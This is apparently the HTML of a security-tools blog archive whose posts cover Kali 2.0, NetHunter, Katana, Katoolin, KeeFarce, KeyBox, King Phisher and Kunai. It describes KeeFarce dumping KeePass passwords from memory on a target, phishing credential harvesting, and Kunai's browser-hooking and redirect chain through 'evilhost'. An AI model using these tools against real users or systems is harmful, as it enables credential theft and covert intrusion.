      <span style="text-align: justify;"> NetHunter image has also been updated to Kali 2.0 and now has a much awaited </span>
      <strong style="text-align: justify;">image for CM12 as well</strong>
      <span style="text-align: justify;"> – check the </span>
      <a href="https://www.offensive-security.com/kali-linux-nethunter-download/" style="text-align: justify;" target="_blank">Offensive Security NetHunter</a>
      <span style="text-align: justify;"> page for more information.</span>
      <br> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;"> 
           <b><span style="font-size: large;"> Updated&nbsp;VMware&nbsp;and&nbsp;VirtualBox Images</span></b>
          </div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
         </div> 
        </div> 
        <div> 
        </div> 
       </div> 
      </div> 
      <div> 
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;">
            Offensive Security, the 
           <strong><a href="https://www.offensive-security.com/information-security-training/" target="_blank">information security training</a></strong>&nbsp;and 
           <strong><a href="https://www.offensive-security.com/offensive-security-solutions/penetration-testing-services/">penetration testing</a></strong> company behind Kali Linux, has put up new 
           <a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank">VMware and VirtualBox Kali 2.0 images</a> for those who want to try Kali in a virtual environment. These include 32 and 64 bit flavours of the GNOME 3 full Kali environment.
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
      <span style="text-align: justify;">If you want to build your own virtual environment, you can consult our documentation site on how to install the various </span>
      <a href="http://docs.kali.org/category/general-use" style="text-align: justify;" target="_blank">virtual guest tools</a>
      <span style="text-align: justify;"> for a smoother experience.</span>
      <br> 
      <div class="wpb_text_column "> 
       <div class="wpb_wrapper"> 
        <br> 
        <b><span style="font-size: large;">How Do I Upgrade to Kali 2.0?</span></b>
        <br> 
        <br>
       </div> 
      </div> 
      <div style="text-align: justify;">
        Yes, you 
       <strong><em>can</em></strong> upgrade Kali 1.x to&nbsp;Kali 2.0!&nbsp;To do this, you will need to edit your source.list entries, and run a 
       <strong>dist-upgrade</strong> as shown below.&nbsp;If you have been using incorrect or extraneous Kali repositories or otherwise manually installed or overwritten Kali packages outside of 
       <strong>apt</strong>, your upgrade to Kali 2.0 may fail.&nbsp;This includes scripts like lazykali.sh, PTF, manual git clones in incorrect directories, etc. – All of these will clobber existing files on the filesystem and result in a failed upgrade. If this is the case for you, you’re better off reinstalling your OS from scratch.
      </div> 
      <div style="text-align: justify;">
        Otherwise, feel free to:
      </div> 
      <pre><code>cat &lt;&lt; EOF &gt; /etc/apt/sources.list
deb http://http.kali.org/kali sana main non-free contrib
deb http://security.kali.org/kali-security/ sana/updates main contrib non-free
EOF

apt-get update
apt-get dist-upgrade # get a coffee, or 10.
reboot</code></pre> 
      <span style="text-align: justify;"><br></span> 
      <br> 
      <div style="text-align: center;"> 
       <span style="font-size: x-large; text-align: justify;"><b><a href="https://www.kali.org/downloads/" target="_blank">Download&nbsp;Kali Linux 2.0</a></b></span>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="3919430614087883429" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Kali Linux NetHunter - Android penetration testing platform  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-3919430614087883429" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-79PeHYRK_As/VKtOJ_k2wrI/AAAAAAAADgc/9bKJ2Y2fcHA/s1600/Kali%2BLinux%2BNetHunter.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-79PeHYRK_As/VKtOJ_k2wrI/AAAAAAAADgc/9bKJ2Y2fcHA/s1600/Kali%2BLinux%2BNetHunter.png" height="406" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        NetHunter is a Android penetration testing platform for Nexus and OnePlus devices built on top of Kali Linux, which includes some special and unique features. Of course, you have all the usual Kali tools in NetHunter as well as the ability to get a full VNC session from your phone to a graphical Kali chroot, however the strength of NetHunter does not end there.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        We’ve incorporated some amazing features into the NetHunter OS which are both powerful and unique. From pre-programmed HID Keyboard (Teensy) attacks, to BadUSB Man In The Middle attacks, to one-click MANA Evil Access Point setups. And yes, NetHunter natively supports wireless 802.11 frame injection with a variety of supported USB NICs. NetHunter is still in its infancy and we are looking forward to seeing this project and community grow.
      </div> 
      <br> 
      <center> 
       <iframe allowfullscreen frameborder="0" height="281" mozallowfullscreen="" src="//player.vimeo.com/video/106012812" webkitallowfullscreen="" width="500"></iframe>
      </center> 
      <br> 
      <div style="text-align: justify;"> 
       <span class="Apple-style-span" style="font-size: large;"><b>Supported Devices</b></span>
      </div> 
      <div style="text-align: justify;">
        The Kali NetHunter image is currently compatible with the following Nexus and OnePlus devices:
      </div> 
      <ul> 
       <li style="text-align: justify;"><strong>Nexus 4 (GSM)</strong> - “mako”</li> 
       <li style="text-align: justify;"><strong>Nexus 5 (GSM/LTE)</strong> - “hammerhead”</li> 
       <li style="text-align: justify;"><strong>Nexus 7 [2012] (Wi-Fi)</strong> - “nakasi”</li> 
       <li style="text-align: justify;"><strong>Nexus 7 [2012] (Mobile)</strong> - “nakasig”</li> 
       <li style="text-align: justify;"><strong>Nexus 7 [2013] (Wi-Fi)</strong> - “razor”</li> 
       <li style="text-align: justify;"><strong>Nexus 7 [2013] (Mobile)</strong> - “razorg”</li> 
       <li style="text-align: justify;"><strong>Nexus 10 (Tablet)</strong> - “mantaray”</li> 
       <li style="text-align: justify;"><strong>OnePlus One 16 GB</strong> - “bacon”</li> 
       <li style="text-align: justify;"><strong>OnePlus One 64 GB</strong> - “bacon”</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Important Concepts</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">Kali NetHunter runs within a chroot environment on the Android device so, for example, if you start an SSH server via an Android application, your SSH connection would connect to Android and not Kali Linux. This applies to all network services.</li> 
       <li style="text-align: justify;">When configuring payloads, the IP address field is the IP address of the system where you want the shell to return to. Depending on your scenario, you may want this address to be something other than the NetHunter.</li> 
       <li style="text-align: justify;">Due to the fact that the Android device is rooted, Kali NetHunter has access to all hardware, allowing you to connect USB devices such as wireless NICs directly to Kali using an OTG cable.</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span class="Apple-style-span" style="font-size: x-large;"><a href="http://www.nethunter.com/download/" target="_blank">Download&nbsp;Kali Linux NetHunter</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4238895890414872815" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Katana - Framework for Hackers, Professional Security and Developers  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4238895890414872815" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-wylFRGZY84k/Vl4LPOB48OI/AAAAAAAAE4Y/iLeTOsqKnB8/s1600/Katana.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="206" src="http://2.bp.blogspot.com/-wylFRGZY84k/Vl4LPOB48OI/AAAAAAAAE4Y/iLeTOsqKnB8/s640/Katana.jpeg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Katana is a framework written in python for making penetration testing, based on a simple and comprehensive structure for anyone to use, modify and share, the goal is to unify tools serve for professional when making a penetration test or simply as a routine tool, The current version is not completely stable, not complete. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The project is open to partners.
      </div> 
      <a name="more"></a>
      <br>
      <h2> SOURCE CODE ORGANIZATION</h2> The Katana source code is organized as follows:
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/KatanaGUI">KatanaGUI/</a></i> &gt; Source code for graphical user interface
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/KatanaLAB">KatanaLAB/</a></i> &gt; Source code for katana laboratory
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/core">core/</a></i> &gt; Source code core
      <br> 
      <i>--<a href="https://github.com/RedToor/Katana/tree/master/core/db">core/db/</a></i> &gt; Dictionaries and tables
      <br> 
      <i>--<a href="https://github.com/RedToor/Katana/tree/master/core/logs">core/logs/</a></i> &gt; Registers of modules
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/files">files/</a></i> &gt; Files necessary for some modules
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/tmp">tmp/</a></i> &gt; Temp files
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/lib">lib/</a></i> &gt; Libraries
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/doc">doc/</a></i> &gt; Documentation
      <br> 
      <i>-<a href="https://github.com/RedToor/Katana/tree/master/scripts">scripts/</a></i> &gt; Scripts(modules)
      <br> 
      <br>
      <h2> MAIN FILES</h2> 
      <pre><code>--core
  ¬Setting.py         --- Setting variables
  ¬design.py          --- Design template
  ¬Errors.py          --- Error Debug
  ¬ping.py            --- Funcitons
--scripts
  ¬__init__.py        --- Modules List

</code></pre>
      <br> 
      <h2> REQUIREMENTS</h2> OS requirement: 
      <a href="https://camo.githubusercontent.com/34e35cfa0e949f4127899fad2550f8ec9d9b52b5/687474703a2f2f7777772e7175657374696f6e2d646566656e73652e636f6d2f77702d636f6e74656e742f7468656d65732f71642f6261636b747261636b2d6d656e752f6261636b747261636b2d6c6f676f2e706e67" target="_blank"><img data-canonical-src="http://www.question-defense.com/wp-content/themes/qd/backtrack-menu/backtrack-logo.png" src="https://camo.githubusercontent.com/34e35cfa0e949f4127899fad2550f8ec9d9b52b5/687474703a2f2f7777772e7175657374696f6e2d646566656e73652e636f6d2f77702d636f6e74656e742f7468656d65732f71642f6261636b747261636b2d6d656e752f6261636b747261636b2d6c6f676f2e706e67" style="max-width: 100%;"></a> Kali Linux
      <br>
      <br> 
      <h2> INSTALLATION&nbsp;</h2> Installation of Katana framework: 
      <br> 
      <pre><code>git clone https://github.com/RedToor/katana.git
cd Katana
chmod 777 install.py
python install.py</code></pre> 
      <br> 
      <h2> USAGE Commands</h2> 
      <pre><code>Stable ------------------------------------------------------------------
./sudo ktf.console                                   98% Builded - Enabled
./sudo ktf.run -m net/arpspoof                       95% Builded - Enabled
Building ----------------------------------------------------------------
ktf.lab                                              30% Builded - No yet.
ktf.linker -m web/whois -t google.com -p 80          80% Builded - No yet.
</code></pre>
      <br> 
      <h2> MODULES (SCRIPTS)</h2> 
      <table>
       <thead> 
        <tr>

        </tr>

    <article class="post hentry" id="6795038424178385323" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Katoolin - Automatically install all Kali Linux tools  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6795038424178385323" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-xIVCtBess_g/VdhyO1zqO3I/AAAAAAAAEgA/tVOIAzYYP5A/s1600/katoolin.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="408" src="http://2.bp.blogspot.com/-xIVCtBess_g/VdhyO1zqO3I/AAAAAAAAEgA/tVOIAzYYP5A/s640/katoolin.png" width="640"></a>
      </div> 
      <br> Automatically install all Kali linux tools
      <br> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">Features</span></b>
      <br> 
      <ul> 
       <li>Add Kali linux repositories</li> 
       <li>Remove kali linux repositorie</li> 
       <li>Install Kali linux tools</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Requirements</span></b>
      <br> 
      <ul> 
       <li>Python 2.7</li> 
       <li>An operating system (tested on Ubuntu)</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Instalation</span></b>
      <br> 
      <pre><code>sudo su
git clone https://github.com/LionSec/katoolin.git &amp;&amp; cp katoolin/katoolin.py /usr/bin/katoolin
chmod +x /usr/bin/katoolin
sudo katoolin
</code></pre> 
      <br> 
      <b><span style="font-size: large;">Video</span></b>
      <br> 
      <div style="text-align: center;"> 
       <iframe allowfullscreen frameborder="0" height="360" src="https://www.youtube.com/embed/8VxCWVoZEEE" width="640"></iframe>
      </div> 
      <br> 
      <b><span style="font-size: large;">Usage</span></b>
      <br> 
      <ul> 
       <li>Just select the number of a tool to install it</li> 
       <li>Press 0 to install all tools</li> 
       <li>back : Go back</li> 
       <li>gohome : Go to the main menu</li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <span style="font-size: x-large;"><b><a href="https://github.com/LionSec/katoolin" target="_blank">Download&nbsp;Katoolin</a></b></span>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6100121642811741504" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> KeeFarce - Extracts Passwords From A Keepass 2.X Database, Directly From Memory  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6100121642811741504" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-XS__-qackI4/VjafJG0UQDI/AAAAAAAAEws/WnYfTP8Dvyo/s1600/KeeFarce.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="http://4.bp.blogspot.com/-XS__-qackI4/VjafJG0UQDI/AAAAAAAAEws/WnYfTP8Dvyo/s320/KeeFarce.png" width="313"></a>
      </div> 
      <br> 
      <br> 
      <div style="text-align: justify;">
        KeeFarce allows for the extraction of KeePass 2.x password database information from memory. The cleartext information, including usernames, passwords, notes and url's are dumped into a CSV file in %AppData%
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> General Design </b> </span> 
      </div> 
      <div style="text-align: justify;">
        KeeFarce uses DLL injection to execute code within the context of a running KeePass process. C# code execution is achieved by first injecting an architecture-appropriate bootstrap DLL. This spawns an instance of the dot net runtime within the appropriate app domain, subsequently executing KeeFarceDLL.dll (the main C# payload). 
      </div> 
      <div style="text-align: justify;">
        The KeeFarceDLL uses 
       <a href="https://github.com/Microsoft/dotnetsamples/tree/master/Microsoft.Diagnostics.Runtime/CLRMD" target="_blank"> CLRMD </a> to find the necessary object in the KeePass processes heap, locates the pointers to some required sub-objects (using offsets), and uses reflection to call an export method. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> Prebuilt Packages </b> </span> 
      </div> 
      <div style="text-align: justify;">
        An appropriate build of KeeFarce needs to be used depending on the KeePass target's architecture (32 bit or 64 bit). Archives and their shasums can be found under the 'prebuilt' directory. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> Executing </b> </span> 
      </div> 
      <div style="text-align: justify;">
        In order to execute on the target host, the following files need to be in the same folder: 
      </div> 
      <ul> 
       <li style="text-align: justify;"> BootstrapDLL.dll </li> 
       <li style="text-align: justify;"> KeeFarce.exe </li> 
       <li style="text-align: justify;"> KeeFarceDLL.dll </li> 
       <li style="text-align: justify;"> Microsoft.Diagnostic.Runtime.dll </li> 
      </ul> 
      <div style="text-align: justify;">
        Copy these files across to the target and execute KeeFarce.exe 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> Building </b> </span> 
      </div> 
      <div style="text-align: justify;">
        Open up the KeeFarce.sln with Visual Studio (note: dev was done on Visual Studio 2015) and hit 'build'. The results will be spat out into dist/$architecture. You'll have to copy the KeeFarceDLL.dll files and Microsoft.Diagnostic.Runtime.dll files into the folder before executing, as these are architecture independent. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> Compatibility </b> </span> 
      </div> 
      <div style="text-align: justify;">
        KeeFarce has been tested on: 
      </div> 
      <ul> 
       <li style="text-align: justify;"> KeePass 2.28, 2.29 and 2.30 - running on Windows 8.1 - both 32 and 64 bit. </li> 
      </ul> 
      <div style="text-align: justify;">
        This should also work on older Windows machines (win 7 with a recent service pack). If you're targeting something other than the above, then testing in a lab environment before hand is recommended. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> Acknowledgements </b> </span> 
      </div> 
      <ul> 
       <li style="text-align: justify;"> <a href="https://github.com/ChadSki/SharpNeedle" target="_blank"> Sharp Needle </a> by Chad Zawistowski was used for the DLL injection tesh. </li> 
       <li style="text-align: justify;"> Code by Alois Kraus was used to get the pointer to object C# voodoo working.</li> 
      </ul> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b> <span style="font-size: x-large;"> <a href="https://github.com/denandz/KeeFarce" target="_blank"> Download KeeFarce </a> </span> </b> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5443565343026227945" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> KeyBox - A web-based SSH console that centrally manages administrative access to systems  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5443565343026227945" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-3R9QQRsHiF4/VamcV02KfqI/AAAAAAAAEYk/GZ0zHSs8wmo/s1600/KeyBox.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="424" src="http://4.bp.blogspot.com/-3R9QQRsHiF4/VamcV02KfqI/AAAAAAAAEYk/GZ0zHSs8wmo/s640/KeyBox.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        KeyBox is a web-based SSH console that centrally manages administrative access to systems. Web-based administration is combined with management and distribution of user's public SSH keys. Key management and administration is based on profiles assigned to defined users.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Administrators can login using two-factor authentication with 
       <a href="https://fedorahosted.org/freeotp">FreeOTP</a> or 
       <a href="https://github.com/google/google-authenticator">Google Authenticator</a>. From there they can manage their public SSH keys or connect to their systems through a web-shell. Commands can be shared across shells to make patching easier and eliminate redundant command execution.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        KeyBox layers TLS/SSL on top of SSH and acts as a bastion host for administration. Protocols are stacked (TLS/SSL + SSH) so infrastructure cannot be exposed through tunneling / port forwarding. More details can be found in the following whitepaper: 
       <a href="http://www.sans.org/reading-room/whitepapers/vpns/security-implications-ssh-1180">The Security Implications of SSH</a>. Also, SSH key management is enabled by default to prevent unmanaged public keys and enforce best practices.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Prerequisites</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">Java JDK 1.7 or greater <a href="http://www.oracle.com/technetwork/java/javase/overview/index.html">http://www.oracle.com/technetwork/java/javase/overview/index.html</a></li> 
       <li style="text-align: justify;">Browser with Web Socket support <a href="http://caniuse.com/websockets">http://caniuse.com/websockets</a> <em>Note: In Safari if using a self-signed certificate you must import the certificate into your Keychain. Select 'Show Certificate' -&gt; 'Always Trust' when prompted in Safari</em></li> 
       <li style="text-align: justify;">Maven 3 or greater ( Only needed if building from source ) <a href="http://maven.apache.org/">http://maven.apache.org</a></li> 
       <li style="text-align: justify;">Install <a href="https://fedorahosted.org/freeotp">FreeOTP</a> or <a href="https://github.com/google/google-authenticator">Google Authenticator</a> to enable two-factor authentication with Android or iOS</li> 
      </ul> 
      <div> 
       <br> 
       <b><span style="font-size: large;"> To Run Bundled with Jetty</span></b>
       <br> 
       <br> If you're not big on the idea of building from source...
       <br> Download keybox-jetty-vXX.XX.tar.gz
       <br> 
       <a href="https://github.com/skavanagh/KeyBox/releases">https://github.com/skavanagh/KeyBox/releases</a>
       <br> Export environment variables
       <br> for Linux/Unix/OSX
       <br> 
       <pre><code> export JAVA_HOME=/path/to/jdk
 export PATH=$JAVA_HOME/bin:$PATH
</code></pre> for Windows
       <br> 
       <pre><code> set JAVA_HOME=C:\path\to\jdk
 set PATH=%JAVA_HOME%\bin;%PATH%
</code></pre> Start KeyBox
       <br> for Linux/Unix/OSX
       <br> 
       <pre><code>    ./startKeyBox.sh
</code></pre> for Windows
       <br> 
       <pre><code>    startKeyBox.bat
</code></pre> How to Configure SSL in Jetty (it is a good idea to add or generate your own unique certificate)
       <br> 
       <a href="http://wiki.eclipse.org/Jetty/Howto/Configure_SSL">http://wiki.eclipse.org/Jetty/Howto/Configure_SSL</a>
       <br> 
       <br> 
       <b><span style="font-size: large;"> Using KeyBox</span></b>
       <br> 
       <br> Open browser to https://&lt;whatever ip&gt;:8443
       <br> Login with
       <br> 
       <pre><code>username:admin
password:changeme
</code></pre> 
       <br> 
       <b>Steps:</b>
       <br> 
       <ol> 
        <li>Create systems</li> 
        <li>Create profiles</li> 
        <li>Assign systems to profile</li> 
        <li>Assign profiles to users</li> 
        <li>Users can login to create sessions on assigned systems</li> 
        <li>Start a composite SSH session or create and execute a script across multiple sessions</li> 
        <li>Add additional public keys to systems</li> 
        <li>Disable any adminstrative public key forcing key rotation.</li> 
        <li>Audit session history</li> 
       </ol> 
       <div> 
        <br>
       </div> 
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/skavanagh/KeyBox" target="_blank">Download&nbsp;KeyBox</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1540925037982638155" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> King Phisher - Phishing Campaign Toolkit  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1540925037982638155" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-lWTdGNQYAT0/VVzmWLmPPJI/AAAAAAAAEDM/0-5RjewR18A/s1600/king-phisher.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-lWTdGNQYAT0/VVzmWLmPPJI/AAAAAAAAEDM/0-5RjewR18A/s1600/king-phisher.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. It features an easy to use, yet very flexible architecture allowing full control over both emails and server content. King Phisher can be used to run campaigns ranging from simple awareness training to more complicated scenarios in which user aware content is served for harvesting credentials.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        King Phisher is only to be used for legal applications when the explicit permission of the targeted organization has been obtained.
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-qwDmXrwLS-8/VVznnSg7CwI/AAAAAAAAEDY/1KOUtFwoaIc/s1600/king%2Bphisher.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="492" src="http://1.bp.blogspot.com/-qwDmXrwLS-8/VVznnSg7CwI/AAAAAAAAEDY/1KOUtFwoaIc/s640/king%2Bphisher.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Why Use King Phisher</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Fully Featured And Flexible</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        King Phisher was created out of a need for an application that would facilitate running multiple separate campaigns with different goals ranging from education, credential harvesting and so called "Drive By" attacks. King Phisher has been used to run campaigns ranging from hundreds of targets to tens of thousands of targets with ease. It also supports sending messages with embedded images and determining when emails are opened with a tracking image.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Integrated Web Server</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        King Phisher uses the packaged web server that comes standard with Python making configuring a separate instance unnecessary.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Open Source</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The Python programming language makes it possible to modify the King Phisher source code to suite the specific needs of the user. Alternatively end users not interested in modifying the source code are welcome to open an issue and request a feature. Users are able to run campaigns as large as they like, as often as they like.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>No Web Interface</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        No web interface makes it more difficult for prying eyes to identify that the King Phisher server is being used for social engineering. Additionally the lack of a web interface reduces the exposure of the King Phisher operator to web related vulnerabilities such as XSS.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/securestate/king-phisher" target="_blank">Download&nbsp;King Phisher</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8001981064465232873" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Kunai - Pwning &amp; Info Gathering via User Browser  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8001981064465232873" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-VJwY6pak0u8/VUzDD1r5JII/AAAAAAAAD_M/Utvvn05SiAY/s1600/kunai.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="322" src="http://3.bp.blogspot.com/-VJwY6pak0u8/VUzDD1r5JII/AAAAAAAAD_M/Utvvn05SiAY/s640/kunai.png" width="640"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-v_TWJ8DAajA/VUzDDoWiKAI/AAAAAAAAD_I/11yT2WM5XGg/s1600/kunai_2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="http://4.bp.blogspot.com/-v_TWJ8DAajA/VUzDDoWiKAI/AAAAAAAAD_I/11yT2WM5XGg/s640/kunai_2.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Sometimes there is a need to obtain ip address of specific person or perform client-side attacks via user browser. This is what you need in such situations.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Kunai is a simple script which collects many informations about a visitor and saves output to file; furthermore, you may try to perform attacks on user browser, using beef or metasploit. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        In order to grab as many informations as possible, script detects whenever javascript is enabled to obtain more details about a visitor. For example, you can include this script in iframe, or perform redirects, to avoid detection of suspicious activities. Script can notify you via email about user that visit your script. Whenever someone will visit your hook (kunai), output fille will be updated.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Functions</span></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">Stores informations about users in elegant output</li> 
       <li style="text-align: justify;">Website spoofing</li> 
       <li style="text-align: justify;">Redirects</li> 
       <li style="text-align: justify;">BeEF &amp; Metasploit compatibility</li> 
       <li style="text-align: justify;">Email notification</li> 
       <li style="text-align: justify;">Diffrent reaction for javascript disabled browser</li> 
       <li style="text-align: justify;">One file composition</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <span style="font-size: large;"><b>Example configs</b></span>
      <br> 
      <ul> 
       <li>Website spoofing (more stable &amp; better for autopwn &amp; beef):</li> 
       <li>Redirect (better for quick ip catching):</li> 
      </ul> 
      <pre><code>goo.gl/urlink -&gt; evilhost/x.php -&gt; site.com/kitty.png
</code></pre> 
      <ul> 
       <li>Cross Site Scripting (inclusion)</li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://github.com/Smaash/kunai" target="_blank">Download&nbsp;Kunai</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1409900157375577021" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> LiME - Linux Memory Extractor  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1409900157375577021" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
